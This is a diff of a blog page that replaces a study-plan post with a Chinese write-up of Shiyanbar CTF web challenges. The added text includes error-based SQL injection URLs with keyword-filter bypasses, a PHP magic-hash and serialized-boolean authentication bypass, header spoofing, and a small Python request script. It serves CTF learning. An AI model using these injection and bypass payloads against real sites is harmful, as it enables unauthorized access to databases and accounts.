@@ -79,17 +79,19 @@
 
 
 
-<meta name="description" content="0x00 立个f4ag 这一周学习scrapy框架，写些爬虫，爬点有意思的东西 对Metasploit魔鬼训练营 pdf的学习，并写点总结 继续完成cve漏洞的复现，并写出exp 把docker的笔记写出来 还有，搞技术的时候别玩手机！！！！  5.10日见">
+<meta name="description" content="#WEB ##实验吧-CTF-简单的sql注入思路这个题过滤的真的是太多了。。。先单引号判断。存在注入暴库http://ctf5.shiyanbar.com/423/web/?id=11&amp;#39;or updatexml(1,concat(‘0x7e’,(/!select/ /!database()/ /!from/ flag  LIMIT 0,1),’0x7e’),1) or ‘1’=’1爆表h">
 <meta property="og:type" content="article">
-<meta property="og:title" content="1个月学习计划">
-<meta property="og:url" content="http://yoursite.com/2018/04/10/1个月学习计划/index.html">
+<meta property="og:title" content="实验吧WP">
+<meta property="og:url" content="http://yoursite.com/2018/04/23/实验吧/index.html">
 <meta property="og:site_name" content="Hu3sky">
-<meta property="og:description" content="0x00 立个f4ag 这一周学习scrapy框架，写些爬虫，爬点有意思的东西 对Metasploit魔鬼训练营 pdf的学习，并写点总结 继续完成cve漏洞的复现，并写出exp 把docker的笔记写出来 还有，搞技术的时候别玩手机！！！！  5.10日见">
+<meta property="og:description" content="#WEB ##实验吧-CTF-简单的sql注入思路这个题过滤的真的是太多了。。。先单引号判断。存在注入暴库http://ctf5.shiyanbar.com/423/web/?id=11&amp;#39;or updatexml(1,concat(‘0x7e’,(/!select/ /!database()/ /!from/ flag  LIMIT 0,1),’0x7e’),1) or ‘1’=’1爆表h">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-04-10T12:47:56.074Z">
+<meta property="og:image" content="http://yoursite.com/ctf/form.png">
+<meta property="og:updated_time" content="2018-04-24T15:30:15.646Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="1个月学习计划">
-<meta name="twitter:description" content="0x00 立个f4ag 这一周学习scrapy框架，写些爬虫，爬点有意思的东西 对Metasploit魔鬼训练营 pdf的学习，并写点总结 继续完成cve漏洞的复现，并写出exp 把docker的笔记写出来 还有，搞技术的时候别玩手机！！！！  5.10日见">
+<meta name="twitter:title" content="实验吧WP">
+<meta name="twitter:description" content="#WEB ##实验吧-CTF-简单的sql注入思路这个题过滤的真的是太多了。。。先单引号判断。存在注入暴库http://ctf5.shiyanbar.com/423/web/?id=11&amp;#39;or updatexml(1,concat(‘0x7e’,(/!select/ /!database()/ /!from/ flag  LIMIT 0,1),’0x7e’),1) or ‘1’=’1爆表h">
+<meta name="twitter:image" content="http://yoursite.com/ctf/form.png">
 
 
 
@@ -119,13 +121,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/04/10/1个月学习计划/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/04/23/实验吧/"/>
 
 
 
 
 
-  <title>1个月学习计划 | Hu3sky</title>
+  <title>实验吧WP | Hu3sky</title>
   
 
 
@@ -263,7 +265,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/10/1个月学习计划/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/23/实验吧/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Hu3sky">
@@ -280,7 +282,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">1个月学习计划</h1>
+          <h1 class="post-title" itemprop="name headline">实验吧WP</h1>
         
 
         <div class="post-meta">
@@ -292,8 +294,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-10T00:00:00+08:00">
-                2018-04-10
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-23T23:15:09+08:00">
+                2018-04-23
               </time>
             
 
@@ -315,8 +317,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/学习计划/" itemprop="url" rel="index">
-                    <span itemprop="name">学习计划</span>
+                  <a href="/categories/write-up/" itemprop="url" rel="index">
+                    <span itemprop="name">write up</span>
                   </a>
                 </span>
 
@@ -352,14 +354,18 @@
       
 
       
-        <h1 id="0x00-立个f4ag"><a href="#0x00-立个f4ag" class="headerlink" title="0x00 立个f4ag"></a>0x00 立个f4ag</h1><ol>
-<li>这一周学习scrapy框架，写些爬虫，爬点有意思的东西</li>
-<li>对Metasploit魔鬼训练营 pdf的学习，并写点总结</li>
-<li>继续完成cve漏洞的复现，并写出exp</li>
-<li>把docker的笔记写出来</li>
-<li>还有，搞技术的时候别玩手机！！！！ </li>
-<li>5.10日见</li>
-</ol>
+        <p>#WEB</p>
+<p>##实验吧-CTF-简单的sql注入思路<br>这个题过滤的真的是太多了。。。<br>先单引号判断。存在注入<br>暴库<br><a href="http://ctf5.shiyanbar.com/423/web/?id=11&#39;or" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/423/web/?id=11&#39;or</a> updatexml(1,concat(‘0x7e’,(/<em>!select</em>/ /<em>!database()</em>/ /<em>!from</em>/ flag  LIMIT 0,1),’0x7e’),1) or ‘1’=’1<br>爆表<br><a href="http://ctf5.shiyanbar.com/423/web/?id=11&#39;or" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/423/web/?id=11&#39;or</a> updatexml(1,concat(‘0x7e’,(/<em>!select</em>/  table_name  /<em>!from</em>/ information_schema.tables /<em>!where</em>/ /<em>!ttable_schemaable_schema</em>/ = ‘web1’ LIMIT 0,1),’0x7e’),1) or ‘1’=’1 </p>
+<p>查字段<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1%27%20or%20(updatexml(1,concat(0x7e,(/<em>!select</em>/%20colucolumn_namemn_name%20/<em>!from</em>/%20infoinformation_schema.columnsrmation_schema.columns%20/<em>!where</em>/%20table_name=%27flag%27 limit 0,1),0x7e),1))%20or%20%271%27=%271</p>
+<p>查flag<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1%27%20or%20(updatexml(1,concat(0x7e,(/<em>!select</em>/ flag /<em>!from</em>/ <code>flag</code> limit 0,1),0x7e),1))%20or%20%271%27=%271</p>
+<p>##天下武功唯快不破<br>抓包在header看到了一串base64加密的东西，解码 是要求你post的key，但每次要改变。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests as rq</span><br><span class="line">import base64</span><br><span class="line">url = &quot;http://ctf5.shiyanbar.com/web/10/10.php&quot;</span><br><span class="line">headers = rq.get(url).headers</span><br><span class="line">key = base64.b64decode(headers[&apos;FLAG&apos;]).decode().split(&apos;:&apos;)[1]</span><br><span class="line">post = &#123;&apos;key&apos;:key&#125;</span><br><span class="line">s = rq.post(url,data=post)</span><br><span class="line">print(s.text)</span><br></pre></td></tr></table></figure></p>
+<p>##Forms<br>一开始以为是一个爆破。。。都准备写脚本了。<br>结果抓了个包，发现有两个post参数，一个就是PIN，另一个showsource=0，奇怪，然后把0改为1，居然出现源码了。。这下就很简单了啊<br><img src="/ctf/form.png" alt="form"></p>
+<p>##天网管理系统<br>先是右键查看源码，有这样一段说明<br><!-- $test=$_GET['username']; $test=md5($test); if($test=='0') --><br>这里需要用到php弱类型比较，所以我传一个md5后为0的字符串 s878926199a ，这个网上有很多的。之后，返回一个<code>/user.php?fame=hjkleffifer</code>，跟进去。出现页面这样一个页面<code>$unserialize_str = $_POST[&#39;password&#39;]; $data_unserialize = unserialize($unserialize_str); if($data_unserialize[&#39;user&#39;] == &#39;???&#39; &amp;&amp; $data_unserialize[&#39;pass&#39;]==&#39;???&#39;) { print_r($flag); } 伟大的科学家php方言道：成也布尔，败也布尔。 回去吧骚年</code><br>可以看到是需要将pass和user反序列化都等于某一个值的时候，得到flag。但是，并不知道这个值是多少。他有提示 成也布尔，败也布尔，所以这里要用布尔值来绕过，无论比较的值是什么，结果都为true。（a代表array，s代表string，b代表bool，而数字代表个数/长度），构造password的值为 <code>a:2:{s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;}</code> </p>
+<p>##这个看起来有点简单!<br>直接扔sqlmap。得到k0y</p>
+<p>##上传绕过<br>这道题是目录截断，之前也没见过这样的题，在这里学习了一波新姿势<br><a href="https://blog.csdn.net/wy_97/article/details/76549405" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/76549405</a></p>
+<p>##貌似有点难<br>代码审计。直接看源码。需要访问的ip是1.1.1.1。所以直接改XFF头。get flag。</p>
+<p>##头有点大<br>根据题意。改user-agent，一开始我将这句话 Make sure you are in the region of England理解为需要我的ip是England。半天没搞出来。。结果看了wp，直接把<code>Accept-Language</code>改为<code>en-gb</code>就好了。然后改user-agent为<code>Mozilla/5.0;.NET CLR 9.9</code></p>
+<p>##猫抓老鼠<br>抓包。header里有Content-Row: MTUyNDU2OTk1NA==。。直接post。。。得到key</p>
 
       
     </div>
@@ -384,8 +390,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/04/10/scrapy笔记/" rel="next" title="Scrapy笔记">
-                <i class="fa fa-chevron-left"></i> Scrapy笔记
+              <a href="/2018/04/23/i春秋/" rel="next" title="实验吧WP">
+                <i class="fa fa-chevron-left"></i> 实验吧WP
               </a>
             
           </div>
@@ -393,10 +399,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/04/15/线下赛总结/" rel="prev" title="线下赛总结">
-                线下赛总结 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -448,17 +450,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -513,22 +506,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-立个f4ag"><span class="nav-number">1.</span> <span class="nav-text">0x00 立个f4ag</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
